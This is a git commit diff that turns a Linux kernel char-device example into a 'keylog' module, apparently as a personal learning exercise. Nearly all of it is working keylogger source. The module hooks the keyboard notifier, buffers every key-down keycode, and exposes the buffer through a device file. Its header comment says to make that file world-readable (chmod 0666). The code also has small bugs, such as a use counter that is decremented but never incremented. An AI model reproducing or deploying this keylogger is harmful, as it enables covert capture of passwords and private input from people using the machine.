950ab06ce2626ca0e57119506d7e2f4305d382b2
Christopher Chin <ctchin13@gmail.com>
2016-10-08 13:04:17 -0400

    keylog kernel module

--- C/Kernel_Modules/misc/keylog.c
+++ C/Kernel_Modules/misc/keylog.c
@@ -1,23 +1,27 @@
-/* Creates a read-only char device that says how many times it has been
- * read.
+/* keylog - registers to keyboard notifications
+ * Creates a device file at the defined major number.
+ *
+ * After loading, see kernel logs for Major number.
+ * Create a dev file and map it to this module's dev.
+ * mknod /dev/DEV_NAME c MAJOR 0
+ * chmod 0666 /dev/DEV_NAME
  */
-
-#include <linux/kernel.h>
 #include <linux/module.h>
+#include <linux/keyboard.h>
 #include <linux/fs.h>
 #include <asm/uaccess.h>
 
 #define SUCCESS 0
-#define DEV_NAME "chardev"    // Name as it appears in /proc/devices
-#define BUF_LEN 80
+#define DEV_NAME "keylog"    // Name as it appears in /proc/devices
+#define BUF_LEN 4096
 
 static int Major;
-static int Device_Open = 0;
-
+static int in_use = 0;
+static int msg_index = 0;
 static char msg[BUF_LEN];
 static char *msg_ptr;
 
-
+/* Fill callback structure */
 static int device_open(struct inode *, struct file *);
 static int device_release(struct inode *, struct file *);
 static ssize_t device_read(struct file *, char *, size_t, loff_t *);
@@ -28,48 +32,63 @@ static struct file_operations fops = {
     .open = device_open,
     .release = device_release,
 };
+int key_notify(struct notifier_block *nblock, unsigned long code, void *_param);
+static struct notifier_block nb = {
+    .notifier_call = key_notify
+};
 
-/* Called when module is loaded.
- */
-int init_module(void)
+
+static int __init keylog_init(void)
 {
+    // Create device file
     Major = register_chrdev(0, DEV_NAME, &fops);
-
     if (Major < 0) {
         printk(KERN_ALERT "Registering char device failed: %d\n", Major);
         return Major;
     }
 
-    printk(KERN_INFO "Char-dev assigned major number %d. To talk to "
-                     "the driver, create a dev file with\n", Major);
-    printk(KERN_INFO "'mknod /dev/%s c %d 0'\n", DEV_NAME, Major);
-    printk(KERN_INFO "Try various minor numbers. Try to cat and echo to "
-                     "the device file.\n Remove the device file "
-                     "and module when done.\n");
+    printk(KERN_INFO "Major number %d\n", Major);
 
-    return SUCCESS;
+    // Register keyboard notifier
+    register_keyboard_notifier(&nb);
+    return 0;
 }
 
-/* Called when module is unloaded.
- */
-void cleanup_module(void)
+static void __exit keylog_exit(void)
 {
     unregister_chrdev(Major, DEV_NAME);
+    unregister_keyboard_notifier(&nb);
+    return;
+}
+
+
+/* Called from notify block when a key is pressed.
+ */
+int key_notify(struct notifier_block *nblock, unsigned long code, void *_param) {
+    struct keyboard_notifier_param *param = _param;
+    struct vc_data *vc = param->vc;
+
+    int ret = NOTIFY_OK;
+
+    if (code == KBD_KEYCODE) {
+        if (param->down) {
+            if (msg_index < BUF_LEN) {
+                msg[msg_index++] = param->value;
+            }
+        }
+    }
+
+    return ret;
 }
 
 /* Called when a process tries to open the device file.
- * As is "cat /dev/mycharfile"
  */
 static int device_open(struct inode *inode, struct file *file)
 {
-    static int counter = 0;
-
-    if (Device_Open)
+    if (in_use)
         return -EBUSY;
 
-    Device_Open++;
-    sprintf(msg, "I already told you %d times Hello world!\n", counter++);
-    msg_ptr = msg;
+    msg_ptr = msg; // Move buffer pointer to start of buffer
     try_module_get(THIS_MODULE);
 
     return SUCCESS;
@@ -79,7 +98,7 @@ static int device_open(struct inode *inode, struct file *file)
  */
 static int device_release(struct inode *inode, struct file *file)
 {
-    Device_Open--;
+    in_use--;
 
     module_put(THIS_MODULE);
 
@@ -111,7 +130,6 @@ static ssize_t device_read(struct file *file_ptr, char *buffer,
 }
 
 /* Called when a process tries to write to the device file.
- * As in "echo hi > /dev/hello"
  */
 static ssize_t device_write(struct file* file_ptr, const char *buff,
                             size_t len, loff_t *off)
@@ -119,3 +137,10 @@ static ssize_t device_write(struct file* file_ptr, const char *buff,
     printk(KERN_ALERT "Sorry, this operation isn't supported.\n");
     return -EINVAL;
 }
+
+module_init(keylog_init);
+module_exit(keylog_exit);
+
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("Christopher Chin");
+MODULE_DESCRIPTION("Prints keyboard events");
